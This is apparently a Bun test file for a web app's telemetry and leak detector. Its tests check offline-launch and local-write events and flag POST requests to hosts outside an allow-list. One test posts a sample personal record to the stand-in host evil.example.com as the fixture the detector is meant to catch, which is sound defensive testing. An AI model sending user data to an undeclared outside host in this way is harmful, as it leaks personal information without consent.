import { describe, expect, test, beforeEach, mock } from 'bun:test';
import {
  configureKindEmitter,
  noteLocalWrite,
  noteGracefulDegrade,
  notePersonalDataLeak,
  _resetKindEmitterForTests,
} from './kind-emitter.ts';
import { _resetProofForTests, flushNow, configureProof } from './proof.ts';

interface CapturedEvent {
  eventType: string;
  payload?: Record<string, unknown>;
}

function makeFetchCapture(): {
  fetchImpl: typeof fetch;
  events: () => CapturedEvent[];
} {
  const captured: CapturedEvent[] = [];
  const fetchImpl = (async (
    url: RequestInfo | URL,
    init?: RequestInit,
  ): Promise<Response> => {
    if (typeof url === 'string' && url.endsWith('/api/v1/proof')) {
      try {
        const body = JSON.parse((init?.body as string) ?? '{}');
        for (const e of body.events ?? []) {
          captured.push({ eventType: e.eventType, payload: e.payload });
        }
      } catch {
        /* ignore */
      }
      return new Response('{}', { status: 200 });
    }
    // Anything else — pretend success.
    return new Response('{}', { status: 200 });
  }) as typeof fetch;
  return { fetchImpl, events: () => captured };
}

beforeEach(() => {
  _resetKindEmitterForTests();
  _resetProofForTests();
});

describe('configureKindEmitter — kind_local_launch_offline', () => {
  test('emits launch-offline when navigator is offline at boot', async () => {
    const cap = makeFetchCapture();
    configureProof({ appSlug: 'test-app', fetchImpl: cap.fetchImpl });
    configureKindEmitter({ navigatorOverride: { onLine: false } });
    await flushNow();
    expect(cap.events().some((e) => e.eventType === 'kind_local_launch_offline')).toBe(true);
  });

  test('does not emit launch-offline when navigator is online', async () => {
    const cap = makeFetchCapture();
    configureProof({ appSlug: 'test-app', fetchImpl: cap.fetchImpl });
    configureKindEmitter({ navigatorOverride: { onLine: true } });
    await flushNow();
    expect(cap.events().some((e) => e.eventType === 'kind_local_launch_offline')).toBe(false);
  });
});

describe('explicit helper emitters', () => {
  test('noteLocalWrite emits kind_local_write_local', async () => {
    const cap = makeFetchCapture();
    configureProof({ appSlug: 'test-app', fetchImpl: cap.fetchImpl });
    noteLocalWrite({ table: 'recipes' });
    await flushNow();
    const e = cap.events().find((x) => x.eventType === 'kind_local_write_local');
    expect(e).toBeDefined();
    expect(e?.payload).toEqual({ table: 'recipes' });
  });

  test('noteGracefulDegrade emits kind_connected_graceful_degrade', async () => {
    const cap = makeFetchCapture();
    configureProof({ appSlug: 'test-app', fetchImpl: cap.fetchImpl });
    noteGracefulDegrade('api.example.com');
    await flushNow();
    expect(
      cap.events().some(
        (e) =>
          e.eventType === 'kind_connected_graceful_degrade' &&
          e.payload?.host === 'api.example.com',
      ),
    ).toBe(true);
  });

  test('notePersonalDataLeak emits kind_leak_personal_data', async () => {
    const cap = makeFetchCapture();
    configureProof({ appSlug: 'test-app', fetchImpl: cap.fetchImpl });
    notePersonalDataLeak('evil.example.com', 'POST');
    await flushNow();
    const e = cap.events().find((x) => x.eventType === 'kind_leak_personal_data');
    expect(e).toBeDefined();
    expect(e?.payload).toEqual({ host: 'evil.example.com', method: 'POST' });
  });
});

describe('fetch leak detector', () => {
  test('POST to undeclared external host with body fires leak event', async () => {
    const cap = makeFetchCapture();
    const wrappedFetch = mock(async (_input: RequestInfo | URL, _init?: RequestInit) =>
      new Response('{}', { status: 200 }),
    ) as unknown as typeof fetch;
    const fetchHost = { fetch: wrappedFetch };

    configureProof({ appSlug: 'test-app', fetchImpl: cap.fetchImpl });
    configureKindEmitter({
      navigatorOverride: { onLine: true },
      allowedHosts: ['api.openweathermap.org'],
      fetchHost,
    });

    await fetchHost.fetch('https://evil.example.com/save', {
      method: 'POST',
      body: '{"name":"alice"}',
    });
    await flushNow();
    expect(
      cap.events().some(
        (e) =>
          e.eventType === 'kind_leak_personal_data' &&
          e.payload?.host === 'evil.example.com',
      ),
    ).toBe(true);
  });

  test('POST to allowed host does not fire leak event', async () => {
    const cap = makeFetchCapture();
    const wrappedFetch = mock(async () => new Response('{}', { status: 200 })) as unknown as typeof fetch;
    const fetchHost = { fetch: wrappedFetch };

    configureProof({ appSlug: 'test-app', fetchImpl: cap.fetchImpl });
    configureKindEmitter({
      navigatorOverride: { onLine: true },
      allowedHosts: ['api.openweathermap.org'],
      fetchHost,
    });

    await fetchHost.fetch('https://api.openweathermap.org/forecast', {
      method: 'POST',
      body: '{"lat":51,"lng":-0.1}',
    });
    await flushNow();
    expect(cap.events().some((e) => e.eventType === 'kind_leak_personal_data')).toBe(false);
  });

  test('GET requests never fire leak event', async () => {
    const cap = makeFetchCapture();
    const wrappedFetch = mock(async () => new Response('{}', { status: 200 })) as unknown as typeof fetch;
    const fetchHost = { fetch: wrappedFetch };

    configureProof({ appSlug: 'test-app', fetchImpl: cap.fetchImpl });
    configureKindEmitter({
      navigatorOverride: { onLine: true },
      allowedHosts: [],
      fetchHost,
    });

    await fetchHost.fetch('https://anything.example.com/data');
    await flushNow();
    expect(cap.events().some((e) => e.eventType === 'kind_leak_personal_data')).toBe(false);
  });

  test('shippie hosts are never flagged', async () => {
    const cap = makeFetchCapture();
    const wrappedFetch = mock(async () => new Response('{}', { status: 200 })) as unknown as typeof fetch;
    const fetchHost = { fetch: wrappedFetch };

    configureProof({ appSlug: 'test-app', fetchImpl: cap.fetchImpl });
    configureKindEmitter({
      navigatorOverride: { onLine: true },
      fetchHost,
    });

    await fetchHost.fetch('https://shippie.app/__shippie/proof', {
      method: 'POST',
      body: '{"events":[]}',
    });
    await flushNow();
    expect(cap.events().some((e) => e.eventType === 'kind_leak_personal_data')).toBe(false);
  });
});
